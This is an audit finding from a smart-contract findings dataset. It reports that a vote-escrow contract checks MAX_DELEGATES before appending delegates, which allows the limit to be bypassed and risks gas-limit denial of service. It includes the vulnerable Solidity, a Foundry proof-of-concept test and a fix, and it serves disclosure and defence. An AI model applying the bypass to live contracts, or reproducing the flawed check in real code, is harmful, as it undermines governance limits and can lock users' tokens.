# [M] MAX_DELEGATES limit can be bypassed

## Summary
Severity: Medium
Contest weight: 0.7010
Dataset id: 8976
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
delegate() allows votes to be delegated from one ID to another. Each owner of an ID has a maximum limit of 128 delegates ( MAX_DELEGATES = 128 ). However, this limit can be bypassed because the require statement does not validate the newly acquired delegates. This issue can be observed in _moveAllDelegates().
Moreover, if the number of delegates increases significantly, it could trigger DOS. This happens because iterating through the loop may reach the block's gas limit, making it impossible to transfer the NFT or delegate votes.
```solidity
function _moveAllDelegates(address owner, address srcRep, address dstRep) internal {
    ///code...
    if (dstRep != address(0)) {
        uint32 dstRepNum = numCheckpoints[dstRep];
        uint256[] storage dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].tokenIds : checkpoints[dstRep][0].tokenIds;
        uint256[] storage dstRepNew = checkpoints[dstRep][dstRepNum];
        uint256 ownerTokenCount = ownerToNFTokenCount[owner];
        @> require(dstRepOld.length <= MAX_DELEGATES, "dstRep would have too many tokenIds");
        // All the same
        for (uint256 i = 0; i < dstRepOld.length; i++) {
            uint256 tId = dstRepOld[i];
            dstRepNew.push(tId);
        }
        // Plus all that's owned
        for (uint256 i = 0; i < ownerTokenCount; i++) {
            uint256 tId = ownerToNFTokenIdList[owner][i];
            dstRepNew.push(tId);
        }
    }
    if (_isCheckpointInNewBlock(dstRep)) {
        numCheckpoints[dstRep] = dstRepNum + 1;
        checkpoints[dstRep][dstRepNum].timestamp = _timestamp;
    } else {
        checkpoints[dstRep][dstRepNum - 1].tokenIds = dstRepNew;
        delete checkpoints[dstRep][dstRepNum];
    }
```
As you can see, the check for MAX_DELEGATES is performed before the new delegates are added, allowing the limit to be bypassed.
To better understand the issue, copy the following POC into vePeg.t.sol.
```solidity
function test_MAX_DELEGATES_can_be_bypassed() external {
    uint256 aliceAmountToLock = 1;
    uint256 aliceLockDuration = 365 days;
    vm.startPrank(ALICE);
    peg.approve(address(ve), type(uint256).max);
    for(uint256 i = 0; i < 128; i++) {
        uint256 aliceLockId = ve.create_lock_for(aliceAmountToLock, aliceLockDuration, ALICE);
        ve.lock_perpetually(aliceLockId);
    }
    vm.stopPrank();
    vm.startPrank(BOB);
    uint256 bobAmountToLock = 1;
    uint256 bobLockDuration = 365 days;
    peg.approve(address(ve), type(uint256).max);
    for(uint256 i = 0; i < 128; i++) {
        uint256 bobLockId = ve.create_lock_for(bobAmountToLock, bobLockDuration, BOB);
        ve.lock_perpetually(bobLockId);
    }
    vm.stopPrank();
    //1 is from Alice and 150 from Bob
    vm.prank(ALICE);
    ve.delegate(1, 150);
    //As a result, Bob ends up with 256 delegates, exceeding the MAX_DELEGATES limit of 128.
```
To observe the result, print dstRepNew.length inside _moveAllDelegates() after the new delegates are added. To do this, import {console} from "forge-std/console.sol"; and use console.log("dstRepNew:", dstRepNew.length); in vePeg.sol. This approach is necessary because Foundry cannot directly access an array inside a struct from a public mapping. By doing this, you'll see that Bob's delegates reach 256, exceeding the MAX_DELEGATES limit of 128.

## Recommendation
To resolve the issue, check the length of the delegates after the new ones have been added.
```solidity
if (dstRep != address(0)) {
    uint32 dstRepNum = numCheckpoints[dstRep];
    uint256[] storage dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].tokenIds : checkpoints[dstRep][0].tokenIds;
    uint256[] storage dstRepNew = checkpoints[dstRep][dstRepNum];
    uint256 ownerTokenCount = ownerToNFTokenCount[owner];
    // All the same
    for (uint256 i = 0; i < dstRepOld.length; i++) {
        uint256 tId = dstRepOld[i];
        dstRepNew.push(tId);
    }
    // Plus all that's owned
    for (uint256 i = 0; i < ownerTokenCount; i++) {
        uint256 tId = ownerToNFTokenIdList[owner][i];
        dstRepNew.push(tId);
    }
    + require(dstRepNew.length <= MAX_DELEGATES, "dstRep would have too many tokenIds");
    if (_isCheckpointInNewBlock(dstRep)) {
        numCheckpoints[dstRep] = dstRepNum + 1;
        checkpoints[dstRep][dstRepNum].timestamp = _timestamp;
    } else {
        checkpoints[dstRep][dstRepNum - 1].tokenIds = dstRepNew;
        delete checkpoints[dstRep][dstRepNum];
    }
```
